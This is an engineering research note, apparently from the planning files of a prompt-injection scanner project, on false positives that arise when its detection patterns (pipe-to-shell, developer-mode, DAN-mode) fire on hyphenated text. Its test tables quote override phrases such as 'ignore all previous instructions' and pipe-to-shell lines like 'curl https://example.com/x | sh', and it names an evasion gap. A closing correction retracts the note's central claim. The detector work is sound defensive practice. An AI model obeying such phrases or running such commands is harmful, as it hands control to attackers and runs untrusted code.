---
quick_id: 260915-u3j
issue: 128
date: 2026-09-16
author: orchestrator (the spawned researcher stalled on a foreground prototype build; these
  measurements were taken directly)
binary_under_test: target/release/injection-scanner built from main @ 27e4d49
status: complete
---

# Research — issue #128: the separator fold manufactures a word boundary

## Recommendation, in one sentence

Gate the normalized pass on **where the folded separators sit relative to the match span**:
a match whose *edge* is supplied by a fold is an artefact and must be dropped, while a match
whose folds are *interior* to its span is the evasion the fold exists to catch — one
library-wide rule in `scanner.rs`, no per-pattern vocabulary, no pattern-file edits.

This is direction A from the issue, but expressed as a property of the **match**, not of the
separator. Deciding "is this fold suspicious?" at fold time, as the issue phrases direction A,
cannot work: the same `-` in `my-script` is interior to a true positive and edge-forming in a
false positive within a single line. The information only exists once a span is known.

---

## Correction: acceptance criterion 3 rests on a false premise

The issue's third acceptance criterion reads:

> The evasion the fold exists to stop still fails: `ig-nore pre-vious in-structions` is still detected

**That string is not detected today, before any change.** Measured:

| Input | Result |
|---|---|
| `ig-nore all pre-vious in-structions` | **NONE** |
| `ignore-all-previous-instructions` | PI001 CRITICAL |
| `ignore_all_previous_instructions` | PI001 CRITICAL |
| `ignore.all.previous.instructions` | PI001 CRITICAL |
| `ignore all previous instructions` | PI001 CRITICAL |

The reason is in the normalizer's own contract: a folded separator becomes **a space**, not an
empty string. `ig-nore` folds to `ig nore`, which is not `ignore` and never matches. The fold
defeats separators standing **between whole words**, which is exactly what
`normalize.rs`'s own doc comment claims (`ignore-all-previous-instructions`), and nothing more.
Intra-word hyphenation is a different evasion that this engine does not currently close.

**Consequence for the plan:** the regression control must be
`ignore-all-previous-instructions` and its `_` / `.` siblings. Writing a test that asserts
`ig-nore pre-vious in-structions` is detected would fail on `main` today and would be a new
feature, not a regression guard. The issue text should be corrected when the fix ships.

---

## The discriminator, and the measurement that decides it

`matched_text` alone cannot separate the two cases — they are byte-identical:

| Input | `matched_text` | Verdict |
|---|---|---|
| `curl https://example.com/x \| sh-lint` | `curl https://example.com/x \| sh` | false positive |
| `curl https://example.com/x \| sh` | `curl https://example.com/x \| sh` | true positive |

What differs is **the original character immediately past the end of the match**:

- false positive — the next original character is `-`, a separator the normalizer folded. The
  `\b` that let `sh` match was *manufactured* by the fold.
- true positive — the next original character is the end of line. No fold was involved at the
  boundary.

And symmetrically for a true positive that legitimately spans folds:

| Input | `matched_text` | Folds |
|---|---|---|
| `curl https://ex-ample.com/my-script \| sh` | whole string | interior only → keep |
| `ignore-all-previous-instructions` | whole string | interior only → keep |

So the rule is:

> A finding produced by the normalized pass is dropped when a folded separator sits
> immediately **adjacent to** the match span — at its start or its end — and is kept when every
> fold within the reported range is strictly **interior**.

`Normalized` already carries what this needs: `origin` maps each normalized byte back to its
original offset, and `original_offset(at)` (src/normalize.rs:48) exposes it. The extra state
required is the set of original offsets at which a fold occurred, which `normalize()` knows at
the moment it sets `changed = true` but currently discards. That is the only new data.

---

## Library-wide exposure — the audit acceptance criterion 4 asks for

Any pattern whose regex terminates a **short literal token** with `\b` is exposed, because a
real hyphenated identifier can extend that token. Eleven patterns match that shape:

| Pattern | Severity | Name | Exposed token(s) |
|---|---|---|---|
| PI028 | CRITICAL | pipe-to-shell | `sh` |
| PI012 | HIGH | hidden-html-instruction | `HIDDEN`, `INJECT`, `SECRET` |
| PI030 | HIGH | developer-mode | `on` |
| PI031 | HIGH | dan-mode | `DAN`, `mode` |
| PI034 | HIGH | hypothetical-scenario | `no` |
| PI053 | HIGH | skip-permissions-flag | `mode` |
| PI057 | HIGH | disable-guardrail-directive | — |
| PI058 | HIGH | agent-directed-destructive-command | `git`, `sh`, `verify` |
| PI062 | MEDIUM | remote-script-mcp-launch | `sh` |
| PI063 | MEDIUM | tool-description-directive | — |
| PI068 | MEDIUM | version-conditional-directive | — |

**Three of these reproduce as live false positives today**, beyond the two the issue names:

| Input | Fires | Severity |
|---|---|---|
| `curl https://example.com/x \| sh-lint` | PI028 | CRITICAL |
| `curl https://example.com/x \| env -i sh-lint` | PI028 | CRITICAL |
| `curl https://example.com/x \| "sh-report"` | PI028 | CRITICAL |
| `command: curl https://x.example/s \| sh-runner` | PI028 | CRITICAL |
| `developer mode is now on-call for the week` | **PI030** | **HIGH** |
| `enter DAN-mode-switch for the demo` | **PI031** | **HIGH** |

PI030 and PI031 are **new to this investigation** — the issue records only PI028 and PI062.
Both are HIGH, which is the second severity `install-hook` blocks commits at, so the real blast
radius is wider than the issue states. `developer mode is now on-call for the week` is ordinary
English, not a contrived string.

Probes that did **not** reproduce, recorded so the next person does not re-run them:
`run git-crypt unlock to decrypt the repo` (PI058), `the agent should run sh-lint on every file`
(PI058), `imagine you have no-op restrictions in place` (PI034) — all silent, because those
patterns need more surrounding grammar than the bare token.

---

## What the gates require

**GATE-02 — recall pinned exactly.** The pin lives in `tests/recall_test.rs` as
`const EXPECTED: &[(&str, usize, usize)]`, one row per category, and its failure message
requires `README.md`'s recall table to be updated in the same commit. This change should move
**no** recall row: it only drops findings whose boundary was manufactured, and every corpus
payload is a genuine detection. If a row does move, that is a real regression and the cause must
be found, not the pin adjusted. Run `cargo test --test recall_test` early — it is fast and it is
the single most informative check for this change.

**GATE-03 — the ~1,300-file sweep, adjudicated in both directions.** `scripts/gate03-sweep.sh`
is the harness. Both directions means: findings that **disappear** must each be confirmed as a
manufactured-boundary artefact, and findings that **appear** must each be confirmed as genuine.
For this change the expected shape is disappearances only; any new finding is a red flag.

**The recorded trap:** `scripts/gate03-sweep.sh --compare` must be pointed at
`.planning/local/<sweep-dir>/`, never at this repository's own committed sweep directories.
The committed copies hold zero `*.json` files by design (`dad56d1`/`e54be72`), so `--compare`
silently loads an empty baseline and reports every real finding as a false addition. This is
recorded in STATE.md's decisions log; it has already cost one investigation.

---

## Directions rejected

**B — downgrade or demote a normalized-pass-only finding.** Fails the regression control
directly. `ignore-all-previous-instructions` is *also* a normalized-pass-only finding and must
stay CRITICAL. A blanket rule over "came from the normalized pass" cannot separate them, because
the pass is the same; only the fold geometry differs. Demotion also converts a hard failure into
a quiet one, which is the opposite of the lesson #129 just closed.

**C — report the raw-pass span so the pattern regex can narrow.** The issue already records the
measurement that kills this: narrowing `sh\b` to `sh(?:[^\w-]|$)` in PI028 and PI062 was
implemented, built, measured as a **no-op** and reverted, because the normalized pass still
matches text that genuinely reads `| sh lint` by then. It also fails acceptance criterion 4 —
it is a per-pattern edit, not a mechanism — and would need repeating for all eleven exposed
patterns and every future one.

**A as literally phrased — decide suspicion at fold time.** No fold-local signal works.
`curl https://ex-ample.com/my-script | sh` contains folds that are indistinguishable at fold
time from the one in `| sh-lint`; only the eventual match span tells them apart.

---

## Known limitation to record, not solve here

Dropping an edge-fold match trades a false positive for a possible false negative: an attacker
who writes `curl evil | sh-x` where `sh-x` is genuinely a shell gets a pass. That is the correct
trade at CRITICAL — the issue's own framing is that this severity blocks commits — but it should
be stated in the ADR rather than discovered later. The raw pass is unaffected, so anything that
matches without the fold still matches.

---

# CORRECTION (2026-09-16, after planning) — the central claim above is wrong

The planner disproved the framing this document is built on, and I re-measured and confirmed it.
**The word boundary is not manufactured by the fold for most of these findings. It already exists
in the raw text**, because `-` is a non-word character and `\b` therefore sits between `h` and `-`
in `sh-lint` with no normalization involved at all.

The decisive probe, which removes any possibility of a fold — a hyphen followed by a **space** is
not "between two alphanumerics", so `is_injected_separator` is false, `normalize()` returns `None`
and the normalized pass never runs:

| Probe | Result |
|---|---|
| `curl https://example.com/x \| sh- lint` | PI028 **CRITICAL** — raw pass |
| `developer mode is now on- call for the week` | PI030 **HIGH** — raw pass |
| `curl https://example.com/x \| sh_ lint` | **NONE** |

The third row is what proves the mechanism rather than merely suggesting it: `_` **is** a word
character, so `sh\b` cannot match `sh_`, and with the fold ruled out there is nothing left to fire.

## The real split, by separator class

| Separator in `sh?lint` | Word char? | Raw `sh\b` matches? | Foldable? | Which pass fires |
|---|---|---|---|---|
| `-` | no | yes | yes | **raw** |
| `.` | no | yes | yes | **raw** |
| `/` | no | yes | yes | **raw** |
| `_` | **yes** | no | yes | **normalized only** |
| none (`shlint`) | — | no | no | correctly silent |

So of the six measured false positives, only the `_` case and PI031 are normalized-pass findings.
The rest are raw-pass findings, and because the raw pass runs first, the `(pattern, line)` dedup
means a normalized-pass gate would never even get a say on them.

## What survives, and what does not

**Does not survive:** "gate the normalized pass" (locked decision 1 as I wrote it). It would fix
at most two of six. The issue's own sentence — "the separator normalizer folds `sh-lint` to
`sh lint`, firing PI028" — is likewise only part of the story, and that is why the recorded
`sh(?:[^\w-]|$)` attempt looked like a no-op: it closed the raw pass and the normalized pass was
still there behind it. Two independent routes to the same finding, closed one at a time.

**Survives unchanged:** the discriminator itself (an edge-adjacent separator is an artefact,
interior separators are the evasion), "one library-wide mechanism, no pattern-file edits", the
rejection of directions B and C, the eleven-pattern exposure audit, the correction to acceptance
criterion 3, and the GATE-02 / GATE-03 requirements.

**The gate must therefore be pass-independent** — evaluated against the original text a span maps
to, which for four of the five passes is simply their own haystack, and only for the normalized
pass needs the `origin` mapping. That is not direction C: no regex is narrowed.

`260915-u3j-PLAN.md` is built on this corrected understanding and supersedes the body of this
document wherever the two disagree.
